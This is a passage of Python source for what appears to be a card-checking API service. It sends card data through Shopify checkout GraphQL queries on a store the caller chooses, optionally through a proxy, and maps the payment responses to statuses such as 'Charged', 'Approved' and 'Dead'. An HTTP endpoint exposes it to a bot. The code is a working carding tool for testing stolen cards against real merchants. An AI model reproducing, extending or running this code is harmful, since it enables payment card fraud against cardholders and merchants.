    "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)

POLL_QUERY = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)


# ═══ KNOWN DECLINES (from ShopifyK.py) ═══
KNOWN_DECLINES = {
    "CARD_DECLINED": ("CARD_DECLINED", "Card Declined"),
    "GENERIC_DECLINE": ("GENERIC_DECLINE", "Generic Decline"),
    "INSUFFICIENT_FUNDS": ("INSUFFICIENT_FUNDS", "Insufficient Funds"),
    "DO_NOT_HONOR": ("DO_NOT_HONOR", "Do Not Honor"),
    "EXPIRED_CARD": ("EXPIRED_CARD", "Expired Card"),
    "INCORRECT_CVC": ("INCORRECT_CVC", "Incorrect CVC"),
    "INCORRECT_NUMBER": ("INCORRECT_NUMBER", "Incorrect Number"),
    "INCORRECT_ZIP": ("INCORRECT_ZIP", "Incorrect ZIP"),
    "INCORRECT_ADDRESS": ("INCORRECT_ADDRESS", "Incorrect Address"),
    "INVALID_CVC": ("INVALID_CVC", "Invalid CVC"),
    "INVALID_EXPIRY_DATE": ("INVALID_EXPIRY_DATE", "Invalid Expiry"),
    "INVALID_NUMBER": ("INVALID_NUMBER", "Invalid Number"),
    "PROCESSING_ERROR": ("PROCESSING_ERROR", "Processing Error"),
    "PAYMENT_METHOD_UNAVAILABLE": ("PAYMENT_METHOD_UNAVAILABLE", "Method Unavailable"),
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED": ("EXPIRED_CARD", "Expired Card"),
    "PAYMENTS_CREDIT_CARD_BASE_CVV_FAILED": ("INCORRECT_CVC", "CVV Failed"),
    "PAYMENTS_CREDIT_CARD_BASE_ADDRESS_FAILED": ("INCORRECT_ADDRESS", "AVS Failed"),
    "PAYMENTS_CREDIT_CARD_BASE_ZIP_FAILED": ("INCORRECT_ZIP", "ZIP Failed"),
    "PAYMENTS_CREDIT_CARD_BASE_DECLINED": ("CARD_DECLINED", "Card Declined"),
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS": ("INSUFFICIENT_FUNDS", "Insufficient Funds"),
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR": ("DO_NOT_HONOR", "Do Not Honor"),
    "OTP_REQUIRED": ("OTP_REQUIRED", "OTP / 3DS Required"),
    "ORDER_PLACED": ("ORDER_PLACED", "Order Placed 🔥"),
    "CAPTCHA_REQUIRED": ("CAPTCHA_REQUIRED", "Captcha Required"),
    "SITE_NOT_SUPPORTED": ("SITE_NOT_SUPPORTED", "Site Not Supported"),
    "THROTTLED": ("THROTTLED", "Throttled"),
    "UNKNOWN_ERROR": ("UNKNOWN_ERROR", "Unknown Error"),
    "MISMATCHED_BILL": ("MISMATCHED_BILL", "Mismatched Bill"),
}


def parse_response(raw_message, success_flag=False):
    if success_flag:
        return "ORDER_PLACED", "Order Placed 🔥", True
    if not raw_message:
        return "UNKNOWN_ERROR", "Unknown Error", False
    text = str(raw_message)
    upper = text.upper()
    for key in sorted(KNOWN_DECLINES.keys(), key=len, reverse=True):
        if key in upper:
            code, label = KNOWN_DECLINES[key]
            return code, label, code == "ORDER_PLACED"
    for field in ("decline_code", "code"):
        m = re.search(rf'"{field}"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
        if m:
            val = m.group(1).upper()
            if val in KNOWN_DECLINES:
                code, label = KNOWN_DECLINES[val]
                return code, label, code == "ORDER_PLACED"
            return val, val.replace("_", " ").title(), False
    for m in re.findall(r'([A-Z][A-Z_]{3,40})', text):
        if m in KNOWN_DECLINES:
            code, label = KNOWN_DECLINES[m]
            return code, label, code == "ORDER_PLACED"
    fallback = text.strip().splitlines()[0][:80] if text.strip() else "Unknown Error"
    return "UNKNOWN_ERROR", fallback, False


# ═══ RUN CHECK — bot.py compatible ═══
def run_check(site, cc, proxy=None, debug=False):
    parts = cc.split("|")
    if len(parts) != 4:
        return {
            "Response": "INVALID_FORMAT",
            "Price": "-",
            "Gateway": "Unknown",
            "Status": "Dead",
        }

    debug_log = [] if debug else None

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        success, message, gateway, price, currency = loop.run_until_complete(
            process_card(parts[0], parts[1], parts[2], parts[3], site, None, proxy, debug_log)
        )
        loop.close()
    except Exception as e:
        return {
            "Response": f"EXCEPTION: {str(e)[:60]}",
            "Price": "-",
            "Gateway": "Unknown",
            "Status": "Site Error",
            "Debug": " | ".join(debug_log) if debug_log else "",
        }

    code, label, is_ok = parse_response(message, success)

    # Determine Status
    if is_ok:
        status = "Charged"
    elif code == "OTP_REQUIRED":
        status = "Approved"
    elif code in ("INSUFFICIENT_FUNDS",):
        status = "Approved"
    elif "SITE" in code or "PROXY" in code or "CAPTCHA" in code:
        status = "Site Error"
    elif "FAILED" in code:
        status = "Site Error"
    else:
        status = "Dead"

    # Build response for bot.py
    if is_ok:
        response_text = "ORDER_PLACED"
    elif code == "OTP_REQUIRED":
        response_text = "3DS_REQUIRED"
    else:
        response_text = code or "CARD_DECLINED"

    result = {
        "Response": response_text,
        "Price": f"${price}" if price and price != "0.00" else "-",
        "Gateway": gateway if gateway != "UNKNOWN" else "Shopify",
        "Status": status,
        "code": code,
        "message": message,
    }
    if debug:
        result["Debug"] = " | ".join(debug_log)
    return result


# ═══ HTTP HANDLER ═══
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        except Exception:
            pass

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[{BRAND.lower()}-api] " + (fmt % args) + "\n")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if path in ("/", "/health"):
            self._send_json(200, {
                "status": "ok",
                "service": "jinx-api",
                "version": VERSION,
            })
            return

        if path.lower() in ("/shopify", "/shopify/"):
            cc = (qs.get("cc", [""])[0] or "").strip()
            site = (qs.get("site", [""])[0] or "").strip()
            proxy = (qs.get("proxy", [""])[0] or "").strip() or None
            debug = (qs.get("debug", ["0"])[0] or "0") == "1"

            if not cc or not site:
                self._send_json(400, {
                    "Response": "MISSING_PARAMS",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
                return

            try:
                result = executor.submit(run_check, site, cc, proxy, debug).result(timeout=180)
                self._send_json(200, result)
            except Exception as e:
                self._send_json(500, {
                    "Response": f"SERVER_ERROR: {str(e)[:80]}",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
            return

        self._send_json(404, {"error": "not found"})

    def do_POST(self):
        self.do_GET()


# ═══ MAIN ═══
executor = ThreadPoolExecutor(max_workers=WORKERS)


def main():
    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print(f"║  {BRAND} API v{VERSION} (ShopifyK-Based)                       ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Listening : http://{HOST}:{PORT}")
    print(f"  Workers   : {WORKERS}")
    print(f"  Endpoint  : GET /Shopify?cc=<card>&site=<site>&proxy=<opt>&debug=0|1")
    print()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Shutting down...")
        server.shutdown()


if __name__ == "__main__":
    main()
